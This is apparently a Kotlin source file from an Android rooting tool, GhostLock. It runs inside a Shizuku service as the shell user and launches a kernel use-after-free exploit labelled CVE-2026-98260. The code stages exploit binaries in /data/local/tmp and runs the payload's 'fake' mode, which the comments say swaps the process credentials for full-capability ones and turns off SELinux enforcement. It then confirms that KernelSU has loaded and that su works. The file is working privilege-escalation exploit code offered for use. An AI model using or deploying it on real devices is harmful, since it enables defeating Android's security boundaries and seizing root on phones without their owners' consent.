package top.honorhook.tools.ghostlock.shizuku

import android.content.Context
import android.os.Process
import androidx.annotation.Keep
import top.honorhook.tools.ghostlock.data.ManagerScanner
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.RandomAccessFile
import java.util.concurrent.atomic.AtomicBoolean

/**
 * 移植自 GhostLock shizuku/GhostlockUserService.kt（898 行），按 2026-11-03 用户拍板
 * 只保留 CVE-2026-98260 默认路径（runCve98260Blocking 及其依赖链）：
 * runExploit/runExploitAsManager（kernel profile 路径）、runCve64560、CPU 组、
 * 安全模式、debugDir（默认 null 不用）全部不移植。
 * 该类跑在 Shizuku UserService 进程（uid 2000 shell），由 ShizukuExploitRunner 经
 * Shizuku.bindUserService 按类名拉起（UserServiceArgs ComponentName）——类名不可混淆，
 * proguard-rules.pro 有具名 keep。
 */
@Keep
class GhostlockUserService(private val context: Context) : IGhostlockUserService.Stub() {
    private val running = AtomicBoolean(false)

    /* The 98260 payload is larger than a binder transaction, so the app
     * streams it here in chunks before runCve98260 consumes it. */
    private val payloadLock = Any()
    private val pendingPayload = ByteArrayOutputStream()

    private companion object {
        /** Non-zero, but distinct from a hard failure: no match, device intact. */
        const val EXIT_NO_MATCH = 2
        val ANSI_REGEX = Regex("\u001B\\[[0-9;]*[A-Za-z]")
    }

    override fun beginCve98260() {
        synchronized(payloadLock) { pendingPayload.reset() }
    }

    override fun appendCve98260(chunk: ByteArray) {
        synchronized(payloadLock) { pendingPayload.write(chunk) }
    }

    override fun runCve98260(
        su: ByteArray,
        managerPackage: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ) {
        val payload = synchronized(payloadLock) {
            val bytes = pendingPayload.toByteArray()
            pendingPayload.reset()
            bytes
        }
        if (payload.isEmpty()) {
            callback.onLog("<s> error: empty CVE-2026-98260 payload")
            callback.onComplete(1)
            return
        }
        if (!running.compareAndSet(false, true)) {
            callback.onLog("<s> error: another GhostLock process is already running")
            callback.onComplete(1)
            return
        }
        Thread({
            val exitCode = runCatching {
                runCve98260Blocking(payload, su, managerPackage, callback, statusCallback)
            }.getOrElse { error ->
                runCatching { callback.onLog("<s> error: ${error.message}") }
                1
            }
            running.set(false)
            runCatching { callback.onComplete(exitCode) }
        }, "ghostlock-cve98260-runner").start()
    }

    private fun runCve98260Blocking(
        payload: ByteArray,
        su: ByteArray,
        managerPackage: String?,
        callback: IGhostlockCallback,
        statusCallback: IGhostlockStatusCallback,
    ): Int {
        require(Process.myUid() == Process.SHELL_UID) {
            "Shizuku UserService uid=${Process.myUid()}, expected ${Process.SHELL_UID}"
        }
        val procStatus = File("/proc/self/status").readText()
        require(Regex("(?m)^Seccomp:\\s*0$").containsMatchIn(procStatus)) {
            "Shizuku UserService is still seccomp-filtered"
        }
        callback.onLog("<s> CVE-2026-98260 Android port: uid=${Process.myUid()} Seccomp=0")
        val workDir = File("/data/local/tmp/ghostlock-app/cve98260").apply {
            require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
        }
        val suDir = File("/data/local/tmp/ghostlock-app/cve64560").apply {
            require(isDirectory || mkdirs()) { "cannot create $absolutePath" }
        }
        val suFile = writePayload(suDir, "cve-64560-su", su)
        val payloadFile = writePayload(workDir, "cve-2026-98260-uid0", payload)
        callback.onLog("<s> payload: ${payloadFile.absolutePath} (${payload.size}B)")

        /* The 98260 payload hands root to whichever manager we name, so resolve
         * the user's choice here; without it the payload self-discovers and
         * always prefers KernelSU. */
        val pm = context.packageManager
        val staging = File("/data/local/tmp/ghostlock-app/ksud")
        callback.onLog("<s> manager choice: ${managerPackage ?: "auto"}")
        val resolved = ManagerScanner.resolveKsud(pm, managerPackage, staging)
        if (resolved != null) {
            callback.onLog("<s> ksud resolved: ${resolved.file.absolutePath} (manager=${resolved.packageName})")
        } else {
            callback.onLog("<s> no manager with libksud.so; payload will self-discover")
        }
        if (managerPackage != null && resolved?.packageName != managerPackage) {
            callback.onLog("<s> $managerPackage has no usable libksud.so; falling back to ${resolved?.packageName ?: "self-discover"}")
        }

        if (isKernelSuLive()) {
            callback.onLog("<s> KernelSU is already live from this boot")
            completeAllSteps(statusCallback)
            logKernelSuIdentity(callback)
            return 0
        }

        val logFile = File(workDir, "cve-2026-98260.log")
        runCatching { logFile.delete() }
        statusCallback.onStatus("c1", "in_progress")
        callback.onLog("<b> starting CVE-2026-98260 UAF process (fake cred -> ksud late-load)")
        // "fake" is YuKongA's chain: swing task->cred at a full-cap fake cred,
        // clear selinux_state.enforcing, then exec ksud late-load for this KMI.
        val process = ProcessBuilder(payloadFile.absolutePath, "fake")
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.to(logFile))
            .apply {
                if (resolved != null) {
                    environment()["GHOSTLOCK_KSUD"] = resolved.file.absolutePath
                    environment()["GHOSTLOCK_KSU_PKG"] = resolved.packageName
                }
            }
            .start()
        val reader = Thread({
            tailSimpleLog(logFile, process, callback)
        }, "ghostlock-cve98260-log").apply {
            isDaemon = true
            start()
        }
        val deadline = System.currentTimeMillis() + 900_000L
        var rooted = false
        while (System.currentTimeMillis() < deadline) {
            if (isKernelSuLive()) {
                rooted = true
                break
            }
            Thread.sleep(1_000)
        }
        if (!rooted && isKernelSuLive()) rooted = true
        if (rooted) {
            completeAllSteps(statusCallback)
            callback.onLog("<b> ROOT_SUCCESS backend=cve_2026_98260+kernelsu")
            logKernelSuIdentity(callback)
            runCatching { reader.interrupt() }
            return 0
        }
        runCatching { reader.interrupt() }
        runCatching { reader.join(1_000) }
        markStopped(statusCallback)
        callback.onLog("<s> CVE-2026-98260: KernelSU did not come up; device was not rebooted")
        return EXIT_NO_MATCH
    }

    /** True once the late-loaded KernelSU module is listed by the kernel. */
    private fun isKernelSuLive(): Boolean = runCatching {
        File("/proc/modules").readLines().any { it.startsWith("kernelsu ") }
    }.getOrDefault(false)

    /** Report the real KernelSU context so success is not a proxy signal. */
    private fun logKernelSuIdentity(callback: IGhostlockCallback) {
        /* KernelSU does not always expose su on PATH, so probe the known
         * install locations as well as the plain command. */
        val probes = listOf(
            listOf("su", "-c", "id"),
            listOf("/data/adb/ksu/bin/su", "-c", "id"),
            listOf("/system/bin/su", "-c", "id"),
        )
        val out = probes.firstNotNullOfOrNull(::runProbe)
        callback.onLog("<s> ksu identity: ${out ?: "(su unavailable)"}")
    }

    private fun runProbe(command: List<String>): String? = runCatching {
        val process = ProcessBuilder(command).redirectErrorStream(true).start()
        if (!process.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)) {
            process.destroyForcibly()
            return@runCatching null
        }
        process.inputStream.bufferedReader().readText().trim().takeIf { it.isNotEmpty() }
    }.getOrNull()

    private inner class SimpleLogPump(
        private val logFile: File,
        private val callback: IGhostlockCallback,
    ) {
        private var readOffset = 0L
        private val pending = StringBuilder()

        fun pump() {
            if (!logFile.isFile) return
            RandomAccessFile(logFile, "r").use { handle ->
                if (readOffset > handle.length()) {
                    readOffset = 0
                    pending.clear()
                }
                handle.seek(readOffset)
                var line = handle.readLine()
                while (line != null) {
                    if (line.isNotEmpty()) pending.appendLine(line)
                    line = handle.readLine()
                }
                readOffset = handle.length()
            }
            emit()
        }

        fun finish() {
            if (!logFile.isFile) return
            runCatching {
                RandomAccessFile(logFile, "r").use { handle ->
                    if (readOffset > handle.length()) {
                        readOffset = 0
                        pending.clear()
                    }
                    handle.seek(readOffset)
                    var line = handle.readLine()
                    while (line != null) {
                        if (line.isNotEmpty()) pending.appendLine(line)
                        line = handle.readLine()
                    }
                }
            }
            emit()
        }

        private fun emit(value: String) {
            for (part in value.lines()) {
                val text = stripAnsi(part)
                if (text.isNotBlank()) runCatching { callback.onLog(text) }
            }
        }

        private fun emit() {
            emit(pending.toString())
            pending.clear()
        }
    }

    private fun tailSimpleLog(
        logFile: File,
        process: java.lang.Process,
        callback: IGhostlockCallback,
    ) {
        val pump = SimpleLogPump(logFile, callback)
        while (!Thread.currentThread().isInterrupted) {
            runCatching { pump.pump() }
            if (!process.isAlive) break
            Thread.sleep(200)
        }
        pump.finish()
    }

    private fun writePayload(workDir: File, name: String, bytes: ByteArray): File {
        val temporary = File(workDir, "$name.tmp")
        val target = File(workDir, name)
        temporary.writeBytes(bytes)
        if (target.exists() && !target.delete()) {
            throw IllegalStateException("cannot replace ${target.absolutePath}")
        }
        require(temporary.renameTo(target)) { "cannot install ${target.absolutePath}" }
        require(
            target.setReadable(true, false) &&
                target.setExecutable(true, false) &&
                target.setWritable(false, false),
        ) { "cannot chmod ${target.absolutePath}" }
        return target
    }

    private fun markStopped(statusCallback: IGhostlockStatusCallback) {
        for (step in listOf("c1", "c2", "c3")) {
            runCatching { statusCallback.onStatus(step, "stopped") }
        }
    }

    private fun completeAllSteps(statusCallback: IGhostlockStatusCallback) {
        for (step in listOf("c1", "c2", "c3")) {
            runCatching { statusCallback.onStatus(step, "completed") }
        }
    }

    private fun stripAnsi(value: String): String = value.replace(ANSI_REGEX, "")

    override fun destroy() {
        if (!running.get()) kotlin.system.exitProcess(0)
    }
}
